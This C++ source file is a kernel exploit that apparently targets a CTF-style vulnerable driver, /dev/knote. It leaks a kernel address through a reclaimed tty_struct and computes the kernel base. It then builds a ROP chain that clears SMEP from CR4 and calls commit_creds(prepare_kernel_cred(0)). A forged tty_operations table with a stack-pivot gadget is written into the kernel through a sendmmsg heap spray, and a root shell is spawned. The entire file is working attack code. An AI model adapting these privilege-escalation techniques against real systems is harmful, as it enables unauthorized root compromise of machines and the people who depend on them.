#include <iostream>
#include <syscall.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <assert.h>
#include <cstring>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pty.h>
using namespace std;

#define ALLOC_IOCTL 	0x1337
#define EDIT_IOCTL		0x133a
#define READ_IOCTL		0x1339
#define DELETE_IOCTL 	0x1338

#define DEVICE_PATH "/dev/knote"

// The target device in the bss.
int fd;

pthread_t tid;

struct Chunk{
	// This array is used by the epoch function.
	unsigned long epoch[6];

	// The size to fill/read from the chunk of size 0x400
	// should be <= 0x400, which means there is no heap overflow.
	unsigned long size;

	// The chunk of size 0x400 content needs to be here.
	char* userland_addr;
};

// To read from a chunk it takes 7 of unisgned longs for the epoch
// and it ignore the first one, IDK what the implementation is like that
// But I will create its proper struct.
struct ChunkRD{
	unsigned long flag;
	unsigned long epoch[6];
	unsigned long size;
	unsigned long* receive_ptr;
};

unsigned long show_leaks(unsigned long* p){
	for(int i=0; i<(0x400/8); i++)
			cout << i << "\t0x" << hex << p[i] << endl;
	return 0;
}

void edit_chunk(unsigned long);

void* fault_handler(void* arg){
	int uffd = (long)arg;
	static struct uffd_msg uffd_msg;

	while(1){
		struct pollfd pollfd = {
			.fd = (int)uffd,
			.events = POLLIN
		};

		poll(&pollfd, 1, -1);
		read(uffd, &uffd_msg, sizeof(uffd_msg));

		if(uffd_msg.event & UFFD_EVENT_PAGEFAULT){
			 cout << "Page fault detected!" << endl;
			 // Implementaion goes here
			 cout << "End of implementation!" << endl;
			 // End of implementation.
			 struct uffdio_register uffdio_register;
			 uffdio_register.range.start = uffd_msg.arg.pagefault.address;
			 uffdio_register.range.len = 0x1000;
			 uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
			 ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_register.range);
			 return arg;
		}
	}
}

unsigned long* userfaultfd_chunk(){
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;
	unsigned long* p;

	unsigned long uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);

	 p = (unsigned long *)mmap(0x0,
					 0x1000,
					 PROT_READ|PROT_WRITE,
					 MAP_PRIVATE|MAP_ANONYMOUS,
					 -1,
					 0);

	 cout << "Got " << hex << "0x" << p << endl;

	 uffdio_api.api = UFFD_API;
	 uffdio_api.features = 0;

	 ioctl(uffd, UFFDIO_API, &uffdio_api);

	 uffdio_register.range.start = (unsigned long)p;
	 uffdio_register.range.len = 0x1000;
	 uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

	 ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

	 pthread_create(&tid, NULL, fault_handler, (void*)uffd);
	 return p;
}

void delete_chunk(unsigned long index){
	ChunkRD c;
	c.flag = 0xdeadbeef+(index-1);
	for(int i=0; i<6; i++)
			c.epoch[i] = index;
	ioctl(fd, DELETE_IOCTL, &c);
}

unsigned long* read_chunk(unsigned long index){
	ChunkRD c;
	// The flag `0xdeadbeef`
	c.flag = 0xdeadbeef+(index-1);

	for(int i=0; i<6; i++)
			c.epoch[i] = index;
	c.size = 0x400;
	c.receive_ptr = (unsigned long*)malloc(c.size);
	//We need to have a page from mmap
	//So we can free before read.
	//c.receive_ptr = userfaultfd_chunk();
	ioctl(fd, READ_IOCTL, &c);
	return c.receive_ptr;
}

int e = 1;

void alloc_chunk(unsigned long size, string content){
	Chunk c;

	for(int i=0; i<6; i++)
			c.epoch[i] = e;
	e++;

	c.userland_addr = (char*)malloc(size);
	c.size = size;

	content.copy(c.userland_addr, size);
	ioctl(fd, ALLOC_IOCTL, &c);
	free(c.userland_addr);
	return;
}

struct ChunkE{
	unsigned long flag_edit;
	unsigned long flag;
	unsigned long epoch[6];
	unsigned long size;
	unsigned long* receive_ptr;
};


void edit_chunk_time(unsigned long index){
	ChunkE c;
	c.flag_edit = 0xA11AB11BC11CD11D;
	c.flag = 0xdeadbeef+(index-1);

	for(int i=0; i<6; i++)
			c.epoch[i] = index;
	c.size = 0x400;
	c.receive_ptr = (unsigned long*)malloc(c.size);

	ioctl(fd, EDIT_IOCTL, &c);
}

int sendmmsg_port = 11111;

struct daytime_t
{
    long year, month, day, hour, minute, second;
};
struct note_t
{
    struct daytime_t datetime;
    unsigned long epoch;
    unsigned long note_id;
    const char *content;
    unsigned long next;
    unsigned long prev;
};

void socket_sendmmsg(int sock, char *buffer, const unsigned long size)
{
    struct mmsghdr msg[1];

    // memset 0 (due to bug of musl-gcc)
    memset(msg, 0, sizeof(msg));

    msg[0].msg_hdr.msg_iovlen = 0;

    // Buffer to kmalloc.
    msg[0].msg_hdr.msg_control = &buffer[0];
    msg[0].msg_hdr.msg_controllen = size;

    // Make sendmmsg exit easy with EINVAL.
    msg[0].msg_hdr.msg_name = "root";
    msg[0].msg_hdr.msg_namelen = 1;
    //msg[0].msg_hdr.msg_flags = 0;

    int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
    if (rv == -1 && errno != EINVAL)
    {
        perror("[-] sendmmsg()");
        exit(EXIT_FAILURE);
    }
}
void sendmmsg_kmalloc_kfree(int port, char *buffer, const unsigned long size)
{
    int sock[2];

    int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
    if (rv != 0)
    {
        perror("socketpair()");
        exit(EXIT_FAILURE);
    }

    socket_sendmmsg(sock[0], buffer, size);

    close(sock[0]);
}

void limited_kernel_write(const void *ptr, unsigned long value)
{
    struct note_t prefill;
    prefill.prev = ptr;
    prefill.next = value;
    sendmmsg_kmalloc_kfree(sendmmsg_port++, (char*)&prefill, sizeof(struct note_t));

    char buf[8];
    struct daytime_t date = {0, 0, 0, 0, 0, 0};
    alloc_chunk(0x600, "I KNOW NOW");
}
void set_affinity(int which_cpu)
{
	cout << "settign affinitity" << endl;
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}
struct tty_driver
{
};
struct tty_struct
{
};
struct file
{
};
struct ktermios
{
};
struct termiox
{
};
struct serial_icounter_struct
{
};

struct trap_frame{
	char* rip;
       	unsigned long cs;
	unsigned long rflags;
	char* rsp;
	unsigned long ss;
}__attribute__((packed));

trap_frame tf;

void save_state(){
	asm volatile(
			"mov tf+8, cs;"
			"pushf; pop tf+16;"
			"mov tf+24, rsp;"
			"mov tf+32, ss;"
			);
}

void __attribute__((regparm(3)))(*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred)(int cred);

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */

};

struct tty_operations fake_ops;

void elev_priv(){
	commit_creds(prepare_kernel_cred(0));
}

void shell(){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}

typedef unsigned long ulong;

int main(){
	set_affinity(0);
	save_state();
	fd = open(DEVICE_PATH, O_RDWR);
	unsigned long* p;
	// Trying to open /dev/ptmx nd close it
	// to free tty_struct struct, and take it back in the chunk
	// we will allocate. it's size is somewhere around 0x2c0 and we are
	// allocating 0x400, it will take it back.
	close(open("/dev/ptmx", O_RDWR));

	// Let's allocate our first chunk.
	// It will take the index 1.

	alloc_chunk(0x0, "M");
	p = read_chunk(1);
	show_leaks(p);
	unsigned long leak = p[0x4f];
	
	cout << "text leak 0x" << hex << leak << endl;
	unsigned long kernel_base = leak - 0x50b1d0;
	cout << "Kernel base 0x" << hex << kernel_base << endl;

	int ptmx[0x100];

	unsigned long xchg_eax_esp = kernel_base + 0x4752C4;

	char* stack = (char*)mmap((xchg_eax_esp & ~0xfff)&0xffffffff,
					0x1000,
					PROT_READ|PROT_WRITE,
					MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
					-1,
					0
					);
	printf("The stack is at %p\n", stack);
	printf("breakpoint here : %p\n", xchg_eax_esp);
	stack += xchg_eax_esp & 0xfff;
	unsigned long* s = (unsigned long *)stack;
	
	commit_creds = kernel_base + 0xa5540;
	prepare_kernel_cred = kernel_base + 0xa5930;
	ulong iretq = kernel_base + 0x84b157;
	ulong swapgs_pop_rbp = kernel_base + 0x64234;
	ulong mov_cr4_rdi = kernel_base + 0x64150;
	ulong pop_rdi = kernel_base + 0x43f7cc;
	
	*s++ = pop_rdi;
	*s++ = 0x06f0;
	*s++ = mov_cr4_rdi;
	*s++ = elev_priv;
	*s++ = swapgs_pop_rbp;
	*s++ = 0x0;
	*s++ = iretq;
	*s++ = shell;
	*s++ = tf.cs;
	*s++ = tf.rflags;
	*s++ = tf.rsp;
	*s++ = tf.ss;

    memset(&fake_ops, 0, sizeof(fake_ops));
	fake_ops.close = xchg_eax_esp;

    int pty_masters[0x100], pty_slaves[0x100];
	for(int i=0; i<0x100; i++){
		ptmx[i] = open("/dev/ptmx", O_RDWR);
	}

	limited_kernel_write(p[0]+0x18, &fake_ops);
	
	getchar();
	for(int i=0; i<0x100; i++){
		close(ptmx[i]);
	}
	getchar();
	// Close the device.
	close(fd);
	return 0;
}
